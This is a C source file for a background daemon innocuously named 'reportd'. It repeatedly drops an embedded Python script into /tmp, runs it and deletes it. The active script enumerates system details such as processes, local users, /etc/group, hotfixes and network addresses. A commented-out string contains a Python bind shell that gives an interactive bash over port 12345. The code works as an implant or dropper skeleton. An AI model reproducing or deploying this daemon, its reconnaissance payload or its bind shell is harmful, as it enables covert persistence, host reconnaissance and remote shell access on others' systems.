#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define RUNNING_DIR	"/tmp"
#define LOCK_FILE	"reportd.lock"
#define LOG_FILE	"reportd.log"
#define SCRIPT_FILE	"report_generator.py"


void log_message(filename,message)
char *filename;
char *message;
{
FILE *logfile;
	logfile=fopen(filename,"a");
	if(!logfile) return;
	fprintf(logfile,"%s\n",message);
	fclose(logfile);
}

void signal_handler(sig)
int sig;
{
	switch(sig) {
	case SIGHUP:
		log_message(LOG_FILE,"hangup signal caught");
		break;
	case SIGTERM:
		log_message(LOG_FILE,"terminate signal caught");
		exit(0);
		break;
	}
}

void daemonize()
{
int i,lfp;
char str[10];
	if(getppid()==1) return; // already a daemon //
	i=fork();
	if (i<0) exit(1); // fork error //
	if (i>0) exit(0); // parent exits //
	// child (daemon) continues //
	setsid(); // obtain a new process group //
	for (i=getdtablesize();i>=0;--i) close(i); // close all descriptors //
	i=open("/dev/null",O_RDWR); dup(i); dup(i); // handle standart I/O //
	umask(027); // set newly created file permissions //
	chdir(RUNNING_DIR); // change running directory //
	lfp=open(LOCK_FILE,O_RDWR|O_CREAT,0640);
	if (lfp<0) exit(1); // can not open //
	if (lockf(lfp,F_TLOCK,0)<0) exit(0); // can not lock //
	// first instance continues //
	sprintf(str,"%d\n",getpid());
	write(lfp,str,strlen(str)); // record pid to lockfile //
	signal(SIGCHLD,SIG_IGN); // ignore child //
	signal(SIGTSTP,SIG_IGN); // ignore tty signals //
	signal(SIGTTOU,SIG_IGN);
	signal(SIGTTIN,SIG_IGN);
	signal(SIGHUP,signal_handler); // catch hangup signal //
	signal(SIGTERM,signal_handler); // catch kill signal
}



void run() {
    int sfp;
    //char python_program[] = "import socket\nimport subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.setsockopt(socket.IPPROTO_IP, socket.SO_REUSEADDR, 1)\ns.bind((\"\",12345))\ns.listen(1)\n(conn, address) = s.accept()\np=subprocess.Popen([\"/bin/bash\",\"-i\"], stdin=conn, stdout=conn, stderr=conn)\n";

    char python_program[] = "#!/usr/bin/python\n__author__ = \'nclifton\'\n\n# Linux crashes fix by rmoulton\n\nimport sys\nimport os\nimport struct\nimport socket\nimport platform\nimport subprocess\nfrom uuid import getnode as MACAddress\n\ndef main():\n    if len(sys.argv)> 1:\n        file = sys.argv[1]\n    else:\n        file = None\n    hostname = socket.gethostname()\n    fqdn = socket.getfqdn()\n    _void_ptr_size = struct.calcsize(\'P\')\n    operatingSystem = platform.system()\n    if _void_ptr_size * 8 == 32:\n        architecture = \'x86\'\n    elif _void_ptr_size * 8 == 64:\n        architecture = \'x64\'\n    osVersion = platform.release()\n    processor = platform.processor()\n    machine = platform.machine()\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    s.connect((\"8.8.8.8\",80))\n\n    macAddress = MACAddress()\n    if file is None:\n        print \'Operating System:\'+operatingSystem\n        print \'Operating System Version:\'+osVersion\n        print \'Hostname:\'+hostname\n        print \'Fully Qualified Domain Name:\'+fqdn\n        print \'Processor:\'+processor\n        print \'Processor Architecture:\'+machine\n        print \'OS Architecture:\'+architecture\n        if operatingSystem is \'Windows\':\n            hotFixes = subprocess.check_output(\"wmic qfe list\")\n            runProcesses = subprocess.check_output(\"tasklist\")\n            lUsers = subprocess.check_output(\"net user\")\n            lGroups = subprocess.check_output(\"net localgroup\")\n            print \'Hotfixes:\'+hotFixes\n            print \'Running Processes:\'+runProcesses\n            print \'Local Users:\'+lUsers\n            print \'Local User groups:\'+ lGroups\n\n        else:\n            runProcesses = subprocess.check_output([\"/bin/ps\", \"-Af\"])\n            lUsers = subprocess.check_output([\"/bin/ls\", \"/home\"])\n            lGroups = subprocess.check_output([\"/bin/cat\", \"/etc/group\"])\n            print \'Running Processes:\'+runProcesses\n            print \'Local Users:\'+lUsers\n            print \'Local User groups:\'+lGroups\n\n        print \'IP Addresses\'+s.getsockname()[0]\n        print \'MAC Addresses\'+\':\'.join((\"%012X\" % macAddress)[i:i+2] for i in range(0, 12, 2))\n    else:\n        with open(sys.argv[1], \'w\') as file:\n            file.write(\'Operating System:\'+operatingSystem+\'\\n\')\n            file.write(\'Operating System Version:\'+osVersion+\'\\n\')\n            file.write(\'Hostname:\'+hostname+\'\\n\')\n            file.write(\'Fully Qualified Domain Name:\'+fqdn+\'\\n\')\n            file.write(\'Processor:\'+processor+\'\\n\')\n            file.write(\'Processor Architecture:\'+machine+\'\\n\')\n            file.write(\'OS Architecture:\'+architecture+\'\\n\')\n            if operatingSystem is \'Windows\':\n                hotFixes = subprocess.check_output(\"wmic qfe list\")\n                runProcesses = subprocess.check_output(\"tasklist\")\n                lUsers = subprocess.check_output(\"net user\")\n                lGroups = subprocess.check_output(\"net localgroup\")\n                file.write(\'Hotfixes:\'+hotFixes+\'\\n\')\n                file.write(\'Running Processes:\'+runProcesses+\'\\n\')\n                file.write(\'Local Users:\'+lUsers+\'\\n\')\n                file.write(\'Local User groups:\'+lGroups+\'\\n\')\n\n            else:\n                runProcesses = subprocess.check_output([\"/bin/ps\", \"-Af\"])\n                lUsers = subprocess.check_output([\"/bin/ls\", \"/home\"])\n                lGroups = subprocess.check_output([\"/bin/cat\", \"/etc/group\"])\n                file.write(\'Running Processes:\'+runProcesses+\'\\n\')\n                file.write(\'Local Users:\'+lUsers+\'\\n\')\n                file.write(\'Local User groups:\'+lGroups+\'\\n\')\n            file.write(\'IP Addresses\'+s.getsockname()[0]+\'\\n\')\n            file.write(\'MAC Addresses\'+\':\'.join((\"%012X\" % macAddress)[i:i+2] for i in range(0, 12, 2))+\'\\n\')\n            file.close()\n\nif __name__ == \'__main__\':\n\tmain()";

    // Create a python script

    chdir(RUNNING_DIR); // change running directory
    sfp=open(SCRIPT_FILE,O_RDWR|O_CREAT|O_EXCL,0740);

    if (sfp<0) { // File exists
        close(sfp);

    }
    else {
        dprintf(sfp, "%s\n", python_program);
        close(sfp);
    }

    chmod(SCRIPT_FILE, S_IRWXU|S_IRWXG|S_IRWXO);

    // Wait

    sleep(5);

    // Don't bother to check to see if script is executing...
    // Execute it

    int result = fork();
    if (result) {
    	; // This is the parent
    }
    else { // This is the child fork
        execl("/usr/bin/python", "/usr/bin/python", "/tmp/report_generator.py", NULL);
    }

    // Wait

    sleep(10);

    // Delete

    remove(SCRIPT_FILE);


}

main()
{
	daemonize();
	while(1) {
	    sleep(5);
	    run();
	}
}

